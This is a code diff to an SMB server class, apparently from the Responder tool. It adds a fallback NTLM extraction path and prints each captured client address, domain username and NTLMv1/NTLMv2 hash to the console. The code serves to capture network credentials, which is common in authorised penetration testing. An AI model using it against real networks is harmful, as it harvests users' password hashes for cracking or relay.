@@ -410,6 +410,9 @@ class ResponderSMBServer(SimpleSMBServer):
 					if ntlm_data:
 						# Use Responder's challenge instead of impacket's
 						ParseSMBHash(ntlm_data, client_ip, settings.Config.Challenge)
+					else:
+						# Fallback to direct extraction if reconstruction fails
+						self._extract_ntlm_direct(auth_msg, client_ip)
 				except Exception as e:
 					# Fallback to direct extraction if reconstruction fails
 					self._extract_ntlm_direct(auth_msg, client_ip)
@@ -504,6 +507,12 @@ class ResponderSMBServer(SimpleSMBServer):
 					nt_response.hex().upper(), 
 					settings.Config.Challenge.hex().upper()
 				)
+				
+				# Always display to stdout for SMBv2
+				print(text("[SMB] NTLMv1-SSP Client   : %s" % color(client_ip, 3)))
+				print(text("[SMB] NTLMv1-SSP Username : %s" % color(domain_name+'\\'+user_name, 3)))
+				print(text("[SMB] NTLMv1-SSP Hash     : %s" % color(WriteHash, 3)))
+				
 				SaveToDb({
 					'module': 'SMB', 
 					'type': 'NTLMv1-SSP', 
@@ -520,6 +529,12 @@ class ResponderSMBServer(SimpleSMBServer):
 					nt_response[:32].hex().upper(), 
 					nt_response[32:].hex().upper()
 				)
+				
+				# Always display to stdout for SMBv2
+				print(text("[SMB] NTLMv2-SSP Client   : %s" % color(client_ip, 3)))
+				print(text("[SMB] NTLMv2-SSP Username : %s" % color(domain_name+'\\'+user_name, 3)))
+				print(text("[SMB] NTLMv2-SSP Hash     : %s" % color(WriteHash, 3)))
+				
 				SaveToDb({
 					'module': 'SMB', 
 					'type': 'NTLMv2-SSP', 
